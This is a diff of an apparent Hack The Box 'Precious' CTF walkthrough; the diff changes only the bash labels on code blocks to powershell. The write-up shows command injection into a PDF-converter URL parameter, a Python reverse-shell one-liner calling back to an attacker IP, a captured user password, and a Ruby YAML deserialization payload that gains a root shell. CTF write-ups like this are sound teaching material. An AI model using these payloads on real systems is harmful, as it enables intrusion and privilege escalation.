@@ -183,7 +183,7 @@
 <h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <p>Like every machine, we need to know how to access it. HTB gives us the IP address, but we don't know anything else. The IP address is like the address of a house, but we need to figure out which doors are open to get in. In a machine, these doors are called &quot;ports&quot; (in reference to the ports of ships that allow the arrival of goods from the outside world). There are always 65,535 ports in all machines. It's a lot!! But we don't need to knock on all the ports manually... For that, we have a tool called <strong>nmap</strong>.</p>
 <p>First, we need to confirm that we can reach the IP:</p>
-<pre><code class="language-bash">ping -c 1 10.10.11.189
+<pre><code class="language-powershell">ping -c 1 10.10.11.189
 	# PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
 	# 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
 
@@ -197,12 +197,12 @@
 <p>Before we start looking at the website, we can do a more powerful scan, using <strong>nmap</strong> as well.</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/EnumerationTargeted.png" alt="Enumeration targeted ports" /></p>
 <p>This new command gives us more information. The web server redirects us to <strong>http://precious.htb/</strong>, but that website doesn't exist. We know the site is on this IP, but the web server wants us to access it through the URL <strong>http://precious.htb/</strong>. We can do that by telling our machine that the URL <strong>http://precious.htb/</strong> corresponds to the IP of the target machine. For that, we can edit the file <strong>/etc/hosts</strong> as a root (super user) and add the line:</p>
-<pre><code class="language-bash">echo &quot;10.10.11.189\tprecious.htb&quot; &gt;&gt; /etc/hosts
+<pre><code class="language-powershell">echo &quot;10.10.11.189\tprecious.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Now, we can access the website:</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/WebSite.png" alt="Website" /></p>
 <p>It is a website that converts websites to PDF. We can do some basic testing to get more information about the website. We can try to serve a web server and enter the new URL to see what happens:</p>
-<pre><code class="language-bash">python -m http.server 80
+<pre><code class="language-powershell">python -m http.server 80
 </code></pre>
 <p>This is a really simple web server, but it is enough for us. We can enter our URL <strong>(http://10.10.14.144/)</strong> in the field on the website and see what happens:</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/pdfDownload.png" alt="pdf Download" /></p>
@@ -213,7 +213,7 @@
 <blockquote>
 <p>http://10.10.14.144/?name=%20<code>ping -c 1 10.10.14.144</code></p>
 </blockquote>
-<pre><code class="language-bash"># Set up a listener to capture the ping
+<pre><code class="language-powershell"># Set up a listener to capture the ping
 sudo tcpdump -i tun0 icmp
 </code></pre>
 <p>We got a ping back! I also create a tiny script in Python to have a fast way to try remote code execution:</p>
@@ -227,10 +227,10 @@ while True:
 	response = requests.post('**http://precious.htb/**', data=data, verify=False)
 </code></pre>
 <p>Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell on the target machine. But the way we got this is tricky. We need to find a way for the target machine to send its own shell to our machine. It's like trying to enter a house, and we need to find a way for the house to open its own door to give us access... The command that worked on the machine was this:</p>
-<pre><code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'
+<pre><code class="language-powershell">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
 <p>So, if we want to do that on the Website, we need to send this url:</p>
-<pre><code class="language-bash">http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'`
+<pre><code class="language-powershell">http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.144&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'`
 </code></pre>
 <p>The query needs to be that exact and we need to adapt the IP and the port. We also need to set up a listener to capture the shell.</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/ReverseShell.png" alt="Reverse Shell" /></p>
@@ -239,7 +239,7 @@ while True:
 <p>Digging through the folders and files, we'll find credentials for a service used by the user henry.</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/henryCredentials.png" alt="henry credentials" /></p>
 <p>And like 99,9% of people, we can try if the user henry has the same password for is user account. And it works!</p>
-<pre><code class="language-bash">su henry
+<pre><code class="language-powershell">su henry
 # Q3c1AqGHtoI0aXAYFH
 </code></pre>
 <h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
@@ -248,7 +248,7 @@ while True:
 <p>The sudo command is a command to execute another command as root privileges. And <strong>sudo -l</strong> inform us that the user <strong>henry</strong> can execute <strong><em>/usr/bin/ruby /opt/update_dependencies.rb</em></strong> as root. When we examine the update_dependencies.rb file, we realize that the script use &quot;YAML.load&quot; to load that file. That means the file will be deserialized. deserialization is like converting the syntax of the content of the file into object in ruby (in this case). But like in a lot of languages, deserialization can be dangerous... And in this case, we can create our own YAML file to execute a command as root. We can find a good article <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization">here</a> but for python, and <a href="https://www.elttam.com/blog/ruby-deserialization/#content">here</a> in ruby. But the code we will use is <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565">here</a>.</p>
 <p><img src="Assets/HTB-Linux-Easy-Precious/CEwithRootPriv.png" alt="Code execution as root" /></p>
 <p>We just create a file caller <strong>test.txt</strong> for confirm that the code is working. And it works! We can execute command as root. Now, we need a way to get root shell. They are so many ways, but I like this one: I will change permissions on the /usr/bin/bash program to execute it as the owner of the program. The owner of the program is root. So, if we execute the program, we will get a root shell. The code we will use is:</p>
-<pre><code class="language-bash">---
+<pre><code class="language-powershell">---
 - !ruby/object:Gem::Installer
 	i: x
 - !ruby/object:Gem::SpecFetcher
@@ -269,7 +269,7 @@ while True:
 		 method_id: :resolve
 </code></pre>
 <p>Now, we just need to execute the sudo command, and the <strong>bash</strong> program will be altered. And we can execute bash as root with a special flag:</p>
-<pre><code class="language-bash">sudo /usr/bin/ruby /opt/update_dependencies.rb
+<pre><code class="language-powershell">sudo /usr/bin/ruby /opt/update_dependencies.rb
 bash -p
 </code></pre>
 <p><img src="Assets/HTB-Linux-Easy-Precious/RootAndFlags.png" alt="Root shell" /></p>
